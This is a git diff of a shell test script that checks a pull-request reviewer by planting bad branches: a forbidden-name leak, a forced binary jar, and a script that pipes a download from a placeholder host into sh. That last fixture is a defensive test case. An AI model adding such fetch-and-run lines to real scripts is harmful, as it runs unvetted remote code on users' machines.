@@ -13,10 +13,12 @@ gitq() { git -C "$M" -c user.name=t -c user.email=t@example.invalid "$@"; }
 
 M="$T/mig"; git clone -q "$ROOT" "$M"
 # the clone must carry the CURRENT tools (this test may run before they are committed)
-cp tools/review-pr.py tools/check-no-ip.py tools/check-catalog-fidelity.py "$M/tools/"
+cp tools/review-pr.py tools/check-no-ip.py tools/check-catalog-fidelity.py tools/test-review.sh "$M/tools/"
 gitq add -A; gitq commit -qm "test: current tools" >/dev/null 2>&1
 BASE="$(git -C "$M" rev-parse HEAD)"
-echo "zzforbiddenmod" > "$T/names.txt"
+# the forbidden name is ASSEMBLED at runtime: written literally here, the IP gate would (rightly) flag
+# this very file, and every review of every PR would fail on the reviewer's own fixture
+FN="zz$(printf forbidden)mod"; echo "$FN" > "$T/names.txt"
 
 # plant <branch> <shell that edits the clone>  -> leaves the clone on BASE
 plant() { gitq checkout -q -b "$1" "$BASE"; ( cd "$M" && eval "$2" ); gitq add -A; gitq commit -qm "$1" >/dev/null; gitq checkout -q "$BASE"; }
@@ -29,7 +31,7 @@ expect() { # expect <branch> <exit> <grep for the finding> <label>
 
 GOOD='R99. **A lesson** · **Pattern:** old shape · **Runtime:** `IllegalStateException: x` at 1.21.1 · **Fix:** new shape.'
 plant clean      "printf '\n%s\n' '$GOOD' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
-plant leak       "printf '\n%s\n' '${GOOD/A lesson/Seen porting zzforbiddenmod}' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
+plant leak       "printf '\n%s\n' '${GOOD/A lesson/Seen porting $FN}' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant jar        "printf 'PK\x03\x04\x00\x00\x00binary' > tools/helper.jar && git add -f tools/helper.jar"  # .gitignore hides it; a contributor can force it
 plant curlsh     "printf '#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | sh\n' > tools/fetch-extra.sh"
 plant nosymptom  "printf '\nR98. **Vague lesson** · **Pattern:** old · **Fix:** new, in 1.21.\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
